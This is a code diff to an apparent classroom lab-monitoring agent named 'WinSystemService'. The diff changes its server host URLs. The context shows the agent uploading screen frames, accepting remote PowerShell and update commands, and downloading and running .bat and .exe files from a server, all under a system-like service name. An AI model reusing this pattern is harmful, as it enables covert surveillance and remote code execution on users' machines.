@@ -1,4 +1,4 @@
-@echo off
+﻿@echo off
 chcp 65001 >nul
 set "INSTALL_DIR=%LOCALAPPDATA%\WinSystemService"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
@@ -149,7 +149,7 @@ namespace WinSystemService
         private int isSendingCloud = 0;
         private int isSendingLocal = 0;
 
-        private const string LIVE_API = "https://pirireis-api.onrender.com/api/labizleme/frame";
+        private const string LIVE_API = "https://pirireis-bilisim-odev-1.onrender.com/api/labizleme/frame";
         private const string LOCAL_API = "http://192.168.23.244:4000/api/frame";
 
         public LabAgentForm()
@@ -558,7 +558,7 @@ namespace WinSystemService
                     string wallUrl = string.IsNullOrEmpty(url) ? cmd : url;
                     if (wallUrl.StartsWith("/"))
                     {
-                        wallUrl = "https://pirireis-api.onrender.com" + wallUrl;
+                        wallUrl = "https://pirireis-bilisim-odev-1.onrender.com" + wallUrl;
                     }
                     string wallDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WinSystemService");
                     if (!Directory.Exists(wallDir)) Directory.CreateDirectory(wallDir);
@@ -595,8 +595,8 @@ namespace WinSystemService
                 if (type == "update_agent" || (type == "powershell" && (cmd ?? "").Contains("WinSystemSetup.bat")))
                 {
                     SetInstallStatus(id, name, "downloading", 25, "Guncel ajan paketi sunucudan indiriliyor...");
-                    string updateUrl = string.IsNullOrEmpty(url) ? "https://pirireis-api.onrender.com/api/labizleme/WinSystemSetup.bat" : url;
-                    if (updateUrl.StartsWith("/")) updateUrl = "https://pirireis-api.onrender.com" + updateUrl;
+                    string updateUrl = string.IsNullOrEmpty(url) ? "https://pirireis-bilisim-odev-1.onrender.com/api/labizleme/WinSystemSetup.bat" : url;
+                    if (updateUrl.StartsWith("/")) updateUrl = "https://pirireis-bilisim-odev-1.onrender.com" + updateUrl;
                     string newBatPath = Path.Combine(Path.GetTempPath(), "WinSystemSetup_New.bat");
                     using (WebClient wc = new WebClient())
                     {
@@ -724,7 +724,7 @@ namespace WinSystemService
                 string downloadUrl = url;
                 if (downloadUrl.StartsWith("/"))
                 {
-                    downloadUrl = "https://pirireis-api.onrender.com" + downloadUrl;
+                    downloadUrl = "https://pirireis-bilisim-odev-1.onrender.com" + downloadUrl;
                 }
 
                 string ext = ".exe";
@@ -1049,3 +1049,4 @@ namespace WinSystemService
         }
     }
 }
+
